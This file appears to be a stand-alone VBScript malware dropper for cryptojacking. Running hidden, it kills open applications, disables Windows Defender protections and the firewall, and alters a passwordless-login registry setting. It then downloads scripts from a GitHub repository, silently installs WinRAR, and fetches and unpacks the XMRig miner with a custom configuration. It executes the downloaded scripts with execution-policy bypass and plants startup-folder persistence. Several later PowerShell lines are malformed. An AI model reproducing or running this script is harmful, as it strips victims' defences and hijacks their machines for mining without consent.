Set objShell = CreateObject("WScript.Shell")
objShell.Run "powershell.exe -Command Get-Process -Name powershell | Stop-Process -Force", 0, True
objShell.Run "powershell.exe -Command Get-Process | Where-Object { $_.MainWindowHandle -ne 0 } | Stop-Process -Force", 0, True
objShell.Run "powershell.exe -Command Set-MpPreference -PUAProtection 0", 0, True
objShell.Run "powershell.exe -Command Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender' -Name 'PUAProtection' -Value 0", 0, True
objShell.Run "powershell.exe -Command Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False", 0, True
objShell.Run "powershell.exe -Command reg add 'HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Microsoft Defender' /v DisableAntiSpyware /t REG_DWORD /d 1 /f", 0, True
objShell.Run "powershell.exe -Command reg add 'HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\PasswordLess\Device' /v DevicePasswordLessBuildVersion /t REG_DWORD /d 0 /f", 0, True
objShell.Run "powershell.exe -Command Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender' -Name 'DisableAntiSpyware' -Value 1", 0, True
objShell.Run "powershell.exe -Command Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender' -Name 'SubmitSamplesConsent' -Value 2", 0, True
objShell.Run "powershell.exe -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/GALVINVN/-/refs/heads/main/ring.ps1 -OutFile C:\Users\Public\Downloads\ring.ps1", 0, True
objShell.Run "powershell.exe -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/GALVINVN/-/refs/heads/main/rings.cmd -OutFile C:\Users\Public\Downloads\rings.cmd", 0, True
objShell.Run "powershell.exe -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/GALVINVN/-/refs/heads/main/Autorun.vbs -OutFile C:\Users\Public\Downloads\Autorun.vbs", 0, True
objShell.Run "powershell.exe -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/GALVINVN/-/refs/heads/main/configure_system.ps1 -OutFile C:\Users\Public\Downloads\configure_system.ps1", 0, True
objShell.Run "powershell.exe -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/GALVINVN/-/refs/heads/main/hid.vbs -OutFile C:\Users\Public\Downloads\hid.vbs", 0, True
objShell.Run "powershell.exe -Command Invoke-WebRequest -Uri https://www.win-rar.com/fileadmin/winrar-versions/winrar/winrar-x64-701.exe -OutFile C:\Users\Public\Downloads\winrar-x64-701.exe", 0, True
objShell.Run "powershell.exe -Command Start-Process -FilePath 'C:\Users\Public\Downloads\winrar-x64-701.exe' -ArgumentList '/S' -Verb RunAs", 0, True
objShell.Run "powershell.exe -Command Invoke-WebRequest -Uri https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-gcc-win64.zip -OutFile C:\Users\Public\Downloads\xmrig-6.22.2-gcc-win64.zip", 0, True
objShell.Run "powershell.exe -Command & 'C:\Program Files\WinRAR\WinRAR.exe' x -ibck -y 'C:\Users\Public\Downloads\xmrig-6.22.2-gcc-win64.zip' 'C:\Users\Public\Downloads\'", 0, True
WScript.Sleep 2000
objShell.Run "powershell.exe -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/GALVINVN/-/refs/heads/main/COINRUN.cmd -OutFile C:\Users\Public\Downloads\COINRUN.cmd", 0, True
objShell.Run "powershell.exe -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/GALVINVN/-/refs/heads/main/config.json -OutFile C:\Users\Public\Downloads\config.json", 0, True
objShell.Run "powershell.exe -Command Copy-Item -Path C:\Users\Public\Downloads\COINRUN.cmd -Destination C:\Users\Public\Downloads\xmrig-6.22.2\COINRUN.cmd -Force", 0, True
objShell.Run "powershell.exe -Command Copy-Item -Path C:\Users\Public\Downloads\config.json -Destination C:\Users\Public\Downloads\xmrig-6.22.2\config.json -Force", 0, True
objShell.Run "powershell.exe -Command & 'C:\Program Files\WinRAR\WinRAR.exe' x -ibck -y 'C:\Users\Public\Downloads\xmrig-6.22.2-gcc-win64.zip' 'C:\Users\Public\Downloads\'", 0, True
objShell.Run "powershell.exe -ExecutionPolicy Bypass -File C:\Users\Public\Downloads\ring.ps1", 0, True
objShell.Run "powershell.exe -Remove-Item -Path '$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\*' -Force", 0, True
objShell.Run "powershell.exe -$source = 'C:\Users\Public\Downloads\Autorun.vbs'", 0, True
objShell.Run "powershell.exe -$destination = '$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\Autorun.vbs.lnk'", 0, True
objShell.Run "powershell.exe -$WshShell = New-Object -ComObject WScript.Shell", 0, True
objShell.Run "powershell.exe -$shortcut = $WshShell.CreateShortcut($destination)", 0, True
objShell.Run "powershell.exe -$shortcut.TargetPath = $source", 0, True
objShell.Run "powershell.exe -$shortcut.Save()", 0, True
objShell.Run "powershell.exe -$ShortcutPath = 'C:\Users\Public\Downloads\Startup Folder.lnk'", 0, True
objShell.Run "powershell.exe -$TargetPath = '$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup'", 0, True
objShell.Run "powershell.exe -$WScriptShell = New-Object -ComObject WScript.Shell", 0, True
objShell.Run "powershell.exe -$Shortcut = $WScriptShell.CreateShortcut($ShortcutPath)", 0, True
objShell.Run "powershell.exe -$Shortcut.TargetPath = $TargetPath", 0, True
objShell.Run "powershell.exe -$Shortcut.Save()", 0, True
objShell.Run "powershell.exe -$folder = 'C:\Users\Public\Downloads\Startup Folder.lnk'", 0, True
objShell.Run "powershell.exe -ExecutionPolicy Bypass -File C:\Users\Public\Downloads\configure_system.ps1", 0, True
objShell.Run "powershell.exe exit", 0, False
